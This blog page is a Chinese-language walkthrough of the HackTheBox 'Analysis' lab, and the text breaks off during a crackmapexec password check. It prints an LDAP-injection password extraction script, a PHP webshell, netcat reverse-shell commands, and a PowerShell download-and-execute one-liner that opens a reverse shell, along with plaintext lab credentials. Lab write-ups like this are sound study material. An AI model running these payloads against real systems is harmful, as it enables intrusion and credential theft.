<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Analysis - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.250 Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-02-19 08:41 CST Warning: 10.10.11.250 giving up on port becaus">
<meta property="og:type" content="article">
<meta property="og:title" content="Analysis - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.250 Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-02-19 08:41 CST Warning: 10.10.11.250 giving up on port becaus">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219083754512.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219085021198.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219090813727.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219100703527.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219103558075.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219110752538.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219112023588.png">
<meta property="article:published_time" content="2024-01-20T11:38:36.000Z">
<meta property="article:modified_time" content="2025-02-24T08:42:16.891Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/image-20240219083754512.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Analysis - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Analysis - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-01-20T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2024-01-20
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WebService"><span class="post-toc-text">WebService</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#user"><span class="post-toc-text">user</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Hard/Analysis"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Analysis - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-01-20 19:38:36" datetime="2024-01-20T11:38:36.000Z"  itemprop="datePublished">2024-01-20</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219083754512.png" class title="image-20240219083754512">

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>┌──(root㉿kali)-[~]
└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.250
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-19 08:41 CST
Warning: 10.10.11.250 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.250
Host is up (0.37s latency).
Not shown: 64232 closed tcp ports (reset), 1277 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-19 00:41:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, NotesRPC, TLSSessionReq, X11Probe: 
|     Invalid message&quot;
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message&quot;
|     HY000
|   oracle-tns: 
|     Invalid message-frame.&quot;
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49792/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=2/19%Time=65D2A3C4%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0
SF:\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;
SF:)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVersionBindReqTCP,9
SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,2B,&quot;\x05\0\0\0\x
SF:0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20messa
SF:ge\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TerminalServ
SF:erCookie,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20m
SF:essage\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBP
SF:rogNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\
SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\
SF:&quot;\x05HY000&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LD
SF:APBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88
SF:&#39;\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\&quot;\x05HY00
SF:0&quot;)%r(SIPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05
SF:\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x
SF:1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
SF:1\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0
SF:\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r
SF:(oracle-tns,32,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88
SF:&#39;\x1a\x16Invalid\x20message-frame\.\&quot;\x05HY000&quot;)%r(ms-sql-s,9,&quot;\x05\0\0
SF:\0\x0b\x08\x05\x1a\0&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/19%OT=53%CT=1%CU=33427%PV=Y%DS=2%DC=T%G=Y%TM=65D2
OS:A42C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=I%TS=U)
OS:SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=O%TS=U)SEQ(SP=108%GCD=2%ISR=1
OS:0D%TI=I%CI=I%II=I%SS=O%TS=U)OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O
OS:4=M542NW8NNS%O5=M542NW8NNS%O6=M542NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF
OS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-19T00:43:07
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   343.23 ms 10.10.16.1
2   173.40 ms 10.10.11.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.29 seconds
</code></pre>
<p>去加一个 hosts 解析</p>
<pre><code>echo &quot;10.10.11.250 analysis.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<p>然后去访问一下</p>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219085021198.png" class title="image-20240219085021198">

<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><p>是个静态页面，并没有东西，去 fuzz 一下子域名</p>
<pre><code>┌──(root㉿kali)-[~]
└─# ffuf -u &quot;http://analysis.htb/&quot; -H &quot;Host:FUZZ.analysis.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://analysis.htb/
 :: Wordlist         : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.analysis.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 479ms]
:: Progress: [4989/4989] :: Job [1/1] :: 24 req/sec :: Duration: [0:02:17] :: Errors: 0 ::
</code></pre>
<p>去加一个子域名</p>
<pre><code>echo &quot;10.10.11.250 internal.analysis.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<p>然后再去访问一下</p>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219090813727.png" class title="image-20240219090813727">

<p>显示没有权限，那我们直接去 fuzz 一下目录</p>
<pre><code>┌──(root㉿kali)-[~]
└─# ffuf -u &quot;http://internal.analysis.htb/employees/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -e .php,.txt

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 347ms]
Login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 326ms]
</code></pre>
<p>去访问一下</p>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219100703527.png" class title="image-20240219100703527">

<p>总算有可以访问的了</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>复制一个用户名字典出来修改一下</p>
<pre><code>cp /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt user.txt
sed -i &quot;s|$|@analysis.htb|&quot; user.txt
</code></pre>
<p>下载个kerbrute脚本</p>
<blockquote>
<p><a href="https://github.com/ropnop/kerbrute/releases/" target="_blank" rel="noopener">https://github.com/ropnop/kerbrute/releases/</a></p>
</blockquote>
<p>然后去爆破一下</p>
<pre><code>┌─┤(root㉿kali)-[~]
└─# ./kerbrute userenum -d analysis.htb user.txt --dc analysis.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/19/24 - Ronnie Flathers @ropnop

2024/02/19 10:31:58 &gt;  Using KDC(s):
2024/02/19 10:31:58 &gt;   analysis.htb:88

2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       jangel@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       JDoe@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       technician@analysis.htb
2024/02/19 10:31:58 &gt;  [+] VALID USERNAME:       wsmith@analysis.htb
</code></pre>
<p>将 fuzz 出来的用户名保存起来</p>
<p>访问<a href="http://internal.analysis.htb/users/list.php" target="_blank" rel="noopener">http://internal.analysis.htb/users/list.php</a></p>
<pre><code>┌─┤(root㉿kali)-[~]
└─# curl http://internal.analysis.htb/users/list.php
missing parameter
</code></pre>
<p>缺少了参数</p>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219103558075.png" class title="image-20240219103558075">

<p>补上以后，得到了一个用户名和一个表格</p>
<p>猜测应该是 ldap 注入</p>
<p>找到了大佬写的脚本</p>
<pre><code>import argparse
import requests
import urllib.parse

def main():
    charset_path = &quot;/usr/share/seclists/Fuzzing/alphanum-case-extra.txt&quot;
    base_url = &quot;http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)&quot;
    found_chars = &quot;&quot;
    skip_count = 6
    add_star = True
    with open(charset_path, &#39;r&#39;) as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)
            # Check if &#39;*&#39; is found and skip the first 6 &#39;*&#39; characters
            if &#39;*&#39; in char and skip_count &gt; 0:
                skip_count -= 1
                continue
            # Add &#39;*&#39; after encountering it for the first time
            if &#39;*&#39; in char and add_star:
                found_chars += char
                print(f&quot;[+] Found Password: {found_chars}&quot;)
                add_star = False
                continue
            modified_url = base_url.replace(&quot;{FUZZ}&quot;, char_encoded).replace(&quot;{found_char}&quot;, found_chars)
            response = requests.get(modified_url)
            if &quot;technician&quot; in response.text and response.status_code == 200:
                found_chars += char
                print(f&quot;[+] Found Password: {found_chars}&quot;)
                file.seek(0, 0)
if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<pre><code>┌──(root㉿kali)-[~]
└─# python3 poc.py 
[+] Found Password: 9
[+] Found Password: 97
[+] Found Password: 97N
[+] Found Password: 97NT
[+] Found Password: 97NTt
[+] Found Password: 97NTtl
[+] Found Password: 97NTtl*
[+] Found Password: 97NTtl*4
[+] Found Password: 97NTtl*4Q
[+] Found Password: 97NTtl*4QP
[+] Found Password: 97NTtl*4QP9
[+] Found Password: 97NTtl*4QP96
[+] Found Password: 97NTtl*4QP96B
[+] Found Password: 97NTtl*4QP96Bv
</code></pre>
<p>得到了一个密码</p>
<pre><code>username = technician@analysis.htb
passwrod = 97NTtl*4QP96Bv
</code></pre>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219110752538.png" class title="image-20240219110752538">

<p>登录成功</p>
<p>前往 SOC Report 上传一个 webshell</p>
<pre><code>&lt;?php if(isset($_REQUEST[&quot;cmd&quot;])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST[&quot;cmd&quot;]); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; }?&gt;
</code></pre>
<img src="/2024/01/20/Hackthebox/Hard/Analysis/image-20240219112023588.png" class title="image-20240219112023588">

<p>我们之前 fuzz 的时候找到了文件上传的目录，直接访问即可</p>
<pre><code>┌──(root㉿kali)-[~]
└─# curl http://internal.analysis.htb/dashboard/uploads/web.php?cmd=whoami
&lt;pre&gt;analysis\svc_web
&lt;/pre&gt;
</code></pre>
<p>现在来反弹个shell</p>
<pre><code>nc -nvlp 4444
</code></pre>
<p>然后我们利用上传功能传个nc上去</p>
<p>然后反弹即可</p>
<pre><code>http://internal.analysis.htb/dashboard/uploads/web.php?cmd=nc64.exe 10.10.16.10 4444 -e cmd
</code></pre>
<pre><code>┌──(root㉿kali)-[~]
└─# rlwrap nc -nvlp 4444                             
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.10.11.250] 59341
Microsoft Windows [version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. Tous droits r�serv�s.

C:\inetpub\internal\dashboard\uploads&gt;whoami
whoami
analysis\svc_web
</code></pre>
<p>成功获得一个shell</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="WebService"><a href="#WebService" class="headerlink" title="WebService"></a>WebService</h2><p>通过到处乱翻，在 <code>C:\inetpub\internal\users\list.php</code> 中找到了一个账号密码</p>
<pre><code>$ldap_password = &#39;N1G6G46G@G!j&#39;;
$ldap_username = &#39;webservice@analysis.htb&#39;;
$ldap_connection = ldap_connect(&quot;analysis.htb&quot;);
</code></pre>
<p>我们需要上传一个RunasCs上去提权</p>
<pre><code>wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
</code></pre>
<p>再准备一个 Invoke-ConPtyShell.ps1</p>
<blockquote>
<p> <a href="https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1</a></p>
</blockquote>
<p>然后再开一个 nc</p>
<pre><code>stty raw -echo; (stty size; cat) | nc -lvnp 5555
</code></pre>
<p>用python3开一个http服务</p>
<pre><code>python3 -m http.server 80
</code></pre>
<p>然后执行</p>
<pre><code>RunasCs.exe &quot;webservice&quot; &quot;N1G6G46G@G!j&quot; &quot;powershell.exe -c IEX(IWR -UseBasicParsing &#39;http://10.10.16.10/Invoke-ConPtyShell.ps1&#39;); Invoke-ConPtyShell -RemoteIp 10.10.16.10 -RemotePort 5555 -Rows 120 -Cols 38 -CommandLine cmd.exe&quot; -d &quot;analysis.htb&quot;
</code></pre>
<pre><code>Microsoft Windows [version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. Tous droits réservés.

C:\Windows\system32&gt;whoami
analysis\webservice

C:\Windows\system32&gt;hostname
DC-ANALYSIS
</code></pre>
<p>成功获得webservice权限</p>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>查看注册表，可以得到一个密码</p>
<pre><code>C:\Windows\system32&gt;reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x1ab910533
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
</code></pre>
<pre><code>password = 7y4Z4^*y9Zzj
</code></pre>
<p>将我们之前kerbrute枚举出来的用户名保存下来，用crackmapexec进行验证</p>
<pre><code>┌──(root㉿kali)-[~]
└─# crackmapexec winrm 10.10.11.250 -u user.txt -p &#39;7y4Z4^*y9Zzj&#39;
SMB         10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10.0 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
